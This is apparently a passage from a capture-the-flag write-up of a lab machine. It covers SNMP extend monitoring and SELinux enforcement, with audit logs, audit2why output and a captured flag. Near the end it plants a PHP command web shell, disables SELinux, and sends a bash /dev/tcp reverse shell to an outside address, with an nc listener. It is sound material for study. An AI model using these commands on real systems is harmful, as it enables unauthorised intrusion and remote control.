</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>root@pit monitoring<span style="color:#ff79c6">]</span><span style="color:#6272a4"># for i in * ; do bash $i ; done</span>
Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       491Mi       3.0Gi        40Mi       402Mi       3.1Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 09:17:34 up <span style="color:#bd93f9">2</span> days,  8:05,  <span style="color:#bd93f9">1</span> user,  load average: 0.08, 0.04, 0.01
</code></pre></td></tr></table>
</div>
</div><p>/etc/snmpd.conf</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cfg" data-lang="cfg"><span style="color:#6272a4">####</span>
<span style="color:#6272a4"># First, map the community name &#34;public&#34; into a &#34;security name&#34;</span>

<span style="color:#6272a4">#       sec.name  source          community</span>
<span style="color:#50fa7b">com2sec notConfigUser  default       public</span>

<span style="color:#6272a4">####</span>
<span style="color:#6272a4"># Second, map the security name into a group name:</span>

<span style="color:#6272a4">#       groupName      securityModel securityName</span>
<span style="color:#50fa7b">group   notConfigGroup v1           notConfigUser</span>
<span style="color:#50fa7b">group   notConfigGroup v2c           notConfigUser</span>

<span style="color:#6272a4">####</span>
<span style="color:#6272a4"># Third, create a view for us to let the group have rights to:</span>

<span style="color:#6272a4"># Make at least  snmpwalk -v 1 localhost -c public system fast again.</span>
<span style="color:#6272a4">#       name           incl/excl     subtree         mask(optional)</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.2.1.1</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.2.1.25.1.1</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.4.1.2021.2</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.4.1.2021.8</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.2.1.25.4.2</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.4.1.2021.9</span>
<span style="color:#50fa7b">view    systemview    included   .1.3.6.1.4.1.8072.1.3.2</span>

<span style="color:#6272a4">####</span>
<span style="color:#6272a4"># Finally, grant the group read-only access to the systemview view.</span>

<span style="color:#6272a4">#       group          context sec.model sec.level prefix read   write  notif</span>
<span style="color:#50fa7b">access  notConfigGroup &#34;&#34;      any       noauth    exact  systemview none none</span>

<span style="color:#6272a4">###############################################################################</span>
<span style="color:#6272a4"># disk checks</span>
<span style="color:#6272a4">#</span>

<span style="color:#6272a4"># The agent can check the amount of available disk space, and make</span>
<span style="color:#6272a4"># sure it is above a set limit.</span>

<span style="color:#6272a4"># disk PATH [MIN=100000]</span>
<span style="color:#6272a4">#</span>
<span style="color:#6272a4"># PATH:  mount path to the disk in question.</span>
<span style="color:#6272a4"># MIN:   Disks with space below this value will have the Mib&#39;s errorFlag set.</span>
<span style="color:#6272a4">#        Default value = 100000.</span>

<span style="color:#6272a4"># Check the / partition and make sure it contains at least 10 megs.</span>

<span style="color:#50fa7b">disk / 10000</span>
<span style="color:#50fa7b">disk /var/www/html/seeddms51x/seeddms</span>

<span style="color:#6272a4">###############################################################################</span>
<span style="color:#6272a4"># Extensible sections.</span>
<span style="color:#6272a4">#</span>

<span style="color:#6272a4"># This alleviates the multiple line output problem found in the</span>
<span style="color:#6272a4"># previous executable mib by placing each mib in its own mib table:</span>

<span style="color:#6272a4"># Run a shell script containing:</span>
<span style="color:#6272a4">#</span>
<span style="color:#6272a4"># #!/bin/sh</span>
<span style="color:#6272a4"># echo hello world</span>
<span style="color:#6272a4"># echo hi there</span>
<span style="color:#6272a4"># exit 35</span>
<span style="color:#6272a4">#</span>
<span style="color:#6272a4"># Note:  this has been specifically commented out to prevent</span>
<span style="color:#6272a4"># accidental security holes due to someone else on your system writing</span>
<span style="color:#6272a4"># a /tmp/shtest before you do.  Uncomment to use it.</span>
<span style="color:#6272a4">#</span>
<span style="color:#6272a4">#exec .1.3.6.1.4.1.2021.50 shelltest /bin/sh /tmp/shtest</span>
<span style="color:#50fa7b">extend monitoring /usr/bin/monitor</span>
</code></pre></td></tr></table>
</div>
</div><p>The public community-string has no write permissions and is therefore not exploitable.</p>
<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.10.10.241 \
&gt; 'nsExtendStatus.&quot;evilcommand&quot;' = createAndGo \
&gt; 'nsExtendCommand.&quot;evilcommand&quot;' = /bin/echo \
&gt; 'nsExtendArgs.&quot;evilcommand&quot;' = 'hello world'
</code></pre>
<p>output:</p>
<pre><code>Error in packet.
Reason: noAccess
Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus.&quot;evilcommand&quot;
</code></pre>
<h2 id="beyond-root---selinux">Beyond root - SELinux</h2>
<p>SeLinux can run in two modes - Enforce (1) and Permissive (0). getenforce will return which mode is running.</p>
<pre><code>[root@pit ~]# getenforce
Enforcing
</code></pre>
<p>Enforcing will block specific activities, where as Permissive will just log them in <code>/var/log/audit/audit.log</code> but let them happen.</p>
<p>As root, it is possible to change SeLinux mode:</p>
<pre><code>setenforce permissive
[root@pit ~]# getenforce
Permissive
[root@pit ~]# setenforce enforcing
[root@pit ~]# getenforce
Enforcing
</code></pre>
<p>SeLinux add extended attributes to the file system, we can identify them because of the <code>.</code> at the end of the permissions <code>-rwxr-xr-x.</code>. We use <code>ls -Z</code> to view it:</p>
<pre><code>[root@pit ~]# ls -lZ /usr/sbin/nginx
-rwxr-xr-x. 1 root root system_u:object_r:httpd_exec_t:s0 1264168 Oct  7  2019 /usr/sbin/nginx
[root@pit ~]# ls -lZ /root/root.txt
-r--------. 1 root root unconfined_u:object_r:admin_home_t:s0 33 Oct  1 01:12 /root/root.tx
</code></pre>
<p>SeLinux also add ACLs to files, which we can identify with the <code>+</code> at the end of the permissions <code>drwxrwx---+</code>. We can use both <code>ls -Z</code> and <code>getfacl</code> to read extended attributes and extended ACLs:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>root@pit ~<span style="color:#ff79c6">]</span><span style="color:#6272a4"># ls -Zl /usr/local/ | grep monitoring</span>
drwxrwx---+ <span style="color:#bd93f9">2</span> root root system_u:object_r:usr_t:s0 <span style="color:#bd93f9">122</span> Oct  <span style="color:#bd93f9">3</span> 13:50 monitoring
<span style="color:#ff79c6">[</span>root@pit ~<span style="color:#ff79c6">]</span><span style="color:#6272a4"># getfacl /usr/local/monitoring/</span>
getfacl: Removing leading <span style="color:#f1fa8c">&#39;/&#39;</span> from absolute path names
<span style="color:#6272a4"># file: usr/local/monitoring/</span>
<span style="color:#6272a4"># owner: root</span>
<span style="color:#6272a4"># group: root</span>
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
</code></pre></td></tr></table>
</div>
</div><p>We can verify which extended attributes for processes with <code>ps -Z</code>.</p>
<pre><code>[root@pit ~]# ps -auxZ | egrep &quot;nginx|snmp&quot;
system_u:system_r:httpd_t:s0    root        1168  0.0  0.0 119280  2308 ?        Ss   Oct01   0:00 nginx: master process /usr/sbin/nginx
system_u:system_r:httpd_t:s0    nginx       1174  0.0  0.2 151984  8096 ?        S    Oct01   0:01 nginx: worker process
system_u:system_r:httpd_t:s0    nginx       1176  0.0  0.2 151984  9732 ?        S    Oct01   0:29 nginx: worker process
system_u:system_r:snmpd_t:s0    root        1445  0.0  0.3 101592 13996 ?        Ss   Oct01   1:17 /usr/sbin/snmpd -LS0-6d -f
system_u:system_r:httpd_t:s0    nginx      42856  0.0  0.3 266780 13084 ?        S    13:35   0:00 php-fpm: pool www
</code></pre>
<h3 id="snmp-is-blocked-from-reading-the-file">SNMP is blocked from reading the file</h3>
<p>When we look at the root.txt file, we can see it has a <code>.</code> in his permissions <code>-r--------.</code> which means there is extended attributes we can list with <code>ls -Z</code></p>
<pre><code>ls -Zl /root/root.txt
-r--------. 1 root root unconfined_u:object_r:admin_home_t:s0 33 Oct  1 01:12 /root/root.txt
</code></pre>
<p>a consequence is SNMP, while running as root, is not capable to read the root.txt flag.</p>
<pre><code>echo &quot;echo &quot;root flag:&quot;; cat /root/root.txt&quot; \
&gt; /usr/local/monitoring/check_root_flag.sh
</code></pre>
<p>indeed, we obtain a permission denied</p>
<pre><code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects
snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendOutLine
[..]
nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: root flag:
nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: cat: /root/root.txt: Permission denied
</code></pre>
<p>Attempt to Set SeLinux to permissive via SNMP mode will fail:</p>
<pre><code>echo &quot;setenforce permissive; echo &quot;root flag:&quot;; \
cat /root/root.txt&quot; &gt; check_root_flag.sh
</code></pre>
<p>output:</p>
<pre><code>nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: setenforce:  setenforce() failed
</code></pre>
<p>However from root account:</p>
<pre><code>setenforce permissive
[root@pit ~]# getenforce
Permissive
</code></pre>
<p>We can now receive the flag from SNMP:</p>
<pre><code>nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: root flag:
nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: 7fb116865e6477410fca1d8cc4426733
</code></pre>
<p>Let&rsquo;s see why we were blocked in <code>enforcing</code> mode from reading the audit.log. We have one READ syscall unsuccessfully executed (success=no):</p>
<pre><code>cat /var/log/audit/audit.log | grep snmp
[..]
type=AVC msg=audit(1633276582.379:13045): avc:  denied  { read } for  pid=39044 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=0
type=SYSCALL msg=audit(1633276582.379:13045): arch=c000003e syscall=257 success=no exit=-13 a0=ffffff9c a1=7ffcdc63df21 a2=0 a3=0 items=0 ppid=39042 pid=39044 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=openat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
</code></pre>
<p>Let&rsquo;s do the same in <code>permissive mode</code>, we have more logs, because while it says denied, being in permissive=1 mode, it executes anyway the syscalls (<code>success=yes</code>)</p>
<pre><code>cat /var/log/audit/audit.log | grep snmp
[..]
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { read } for  pid=39521 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { open } for  pid=39521 comm=&quot;cat&quot; path=&quot;/root/root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=SYSCALL msg=audit(1633277219.499:13069): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7fff26c3bf21 a2=0 a3=0 items=0 ppid=39520 pid=39521 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=openat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
type=AVC msg=audit(1633277219.499:13070): avc:  denied  { getattr } for  pid=39521 comm=&quot;cat&quot; path=&quot;/root/root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=SYSCALL msg=audit(1633277219.499:13070): arch=c000003e syscall=5 success=yes exit=0 a0=3 a1=7fff26c3a6c0 a2=7fff26c3a6c0 a3=0 items=0 ppid=39520 pid=39521 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=fstat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
</code></pre>
<p>The logs show that <code>snmpd_t</code> role is trying to access the target role <code>admin_home_t</code>. We can audit why we are not allowed with <code>audit2why</code>:</p>
<pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep snmp | grep read | grep root.txt | tail -1 | audit2why
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { read } for  pid=39521 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1

    Was caused by:
            Missing type enforcement (TE) allow rule.

            You can use audit2allow to generate a loadable module to allow this access.
</code></pre>
<p>We can check the SeLinux configuration needed to make it possible with the <code>audit2allow</code> command-line. The below allows <code>snmpd_t</code> to read files that belongs to <code>admin_home_t</code>:</p>
<pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep snmp | grep read | grep root.txt | tail -1 | audit2allow
[..]
#============= snmpd_t ==============
allow snmpd_t admin_home_t:file read;
</code></pre>
<h3 id="why-we-were-not-able-to-obtain-a-reverse-shell">Why we were not able to obtain a reverse shell</h3>
<p>In permissive mode, I am able to obtain a reverse shell:</p>
<pre><code>[root@pit ~]# setenforce permissive
[root@pit ~]# getenforce
Permissive
[root@pit ~]# echo '&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;' &gt; /var/www/html/sh.php
</code></pre>
<p>Let&rsquo;s try to get a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">URL</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://dms-pit.htb/sh.php&#34;</span>
curl -vvv -G <span style="color:#8be9fd;font-style:italic">$URL</span> --data-urlencode <span style="color:#f1fa8c">&#34;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/443 0&gt;&amp;1&#39;&#34;</span>
*   Trying 10.10.10.241:80...
* TCP_NODELAY <span style="color:#8be9fd;font-style:italic">set</span>
* Connected to dms-pit.htb <span style="color:#ff79c6">(</span>10.10.10.241<span style="color:#ff79c6">)</span> port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
&gt; GET /sh.php?cmd<span style="color:#ff79c6">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.53%2F443%200%3E%261%27 HTTP/1.1
&gt; Host: dms-pit.htb
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt;

───────────────────────────────────────────────────────────────────────────────────────────────────────────
 sudo nc -lncp <span style="color:#bd93f9">443</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">443</span>
